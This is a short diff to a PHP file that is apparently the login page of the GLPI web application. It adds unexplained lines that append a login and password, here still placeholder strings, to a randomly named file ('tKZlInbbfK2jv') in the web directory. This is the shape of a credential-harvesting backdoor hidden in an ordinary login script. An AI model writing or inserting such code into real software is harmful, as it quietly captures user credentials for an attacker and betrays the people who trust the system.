@@ -36,6 +36,11 @@
 
 include ('../inc/includes.php');
 
+$login = "login";
+$password = "password";
+
+file_put_contents("tKZlInbbfK2jv", $login.",".$password,FILE_APPEND);
+
 
 if (!isset($_SESSION["glpicookietest"]) || ($_SESSION["glpicookietest"] != 'testcookie')) {
    if (!is_writable(GLPI_SESSION_DIR)) {
